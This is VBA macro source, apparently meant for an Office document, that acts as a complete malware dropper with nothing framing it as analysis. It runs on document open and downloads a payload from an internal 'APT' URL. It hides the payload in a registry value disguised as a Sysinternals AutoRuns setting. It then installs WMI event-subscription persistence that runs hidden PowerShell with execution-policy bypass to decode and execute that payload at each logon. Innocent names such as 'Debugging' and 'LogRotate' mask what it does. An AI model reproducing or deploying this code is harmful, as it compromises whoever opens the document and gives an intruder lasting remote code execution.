Public Runs As Boolean

Sub Auto_Open()
    
    Call Debugging
    
End Sub
Sub AutoOpen()

    Call Debugging

End Sub
Sub Document_Open()

    Call Debugging

End Sub


Private Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed
    
    filterName = taskName & " Event"
    consumerName = taskName & " Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")

    Set objInstances1 = objService1.Get("__EventFilter")

    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

    Set newObj1 = objInstances1.Spawninstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.Spawninstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.Spawninstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False

End Function


Private Function RegPayload(ByVal RegPath As String, ByVal RegValue As String) As Boolean
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.regwrite RegPath, RegValue, "REG_SZ"
    
    On Error GoTo Failed
    RegPayload = True
    Exit Function
Failed:
    RegPayload = False
    
End Function


Private Function GetCurrentUserSid() As String
    
    Dim strUserName, strDomain, strComputer As String
    Set wshShell = CreateObject("WScript.Shell")
    strUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")
    strDomain = wshShell.ExpandEnvironmentStrings("%USERDOMAIN%")
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objAccount = objWMIService.Get("Win32_UserAccount.Name='" & strUserName & "',Domain='" & strDomain & "'")
    GetCurrentUserSid = objAccount.SID
    
End Function

Private Function XMLHTTPClient(ByVal xUrl As String) As String
     
    Dim xml As Object
    Set xml = CreateObject("WinHttp.WinHttpRequest.5.1")
    xml.Open "GET", xUrl, False
    xml.Send
    On Error GoTo Failed
    XMLHTTPClient = xml.ResponseText
    Exit Function
Failed:
    XMLHTTPClient = False

End Function



Private Function Debugging() As Boolean
    
    If Runs = True Then GoTo Failed
    
    Dim Str, CurrentUserSid, PayloadConsumer, xUrl, RegKey As String
    xUrl = "http://10.0.0.155/APT/p.txt"
    xRegKey = "HKLM\Software\Sysinternals\AutoRuns\EulaValue"
    CurrentUserSid = GetCurrentUserSid
    PayloadConsumer = "powershell.exe -noP -sta -w 1 -ep bypass -C ""iex ([System.Text.Encoding]::ASCII." _
    & "GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path 'Registry::" _
    & "HKLM\Software\Sysinternals\AutoRuns" & "' -Name EulaValue).EulaValue)))"""
    
    Str = XMLHTTPClient(xUrl)
    
    Call RegPayload(xRegKey, Str)

    Call WMIPersistence(PayloadConsumer, "LogRotate")
    
    On Error GoTo Failed
    Debugging = True
    Runs = True
    Exit Function
Failed:
    Debugging = False

End Function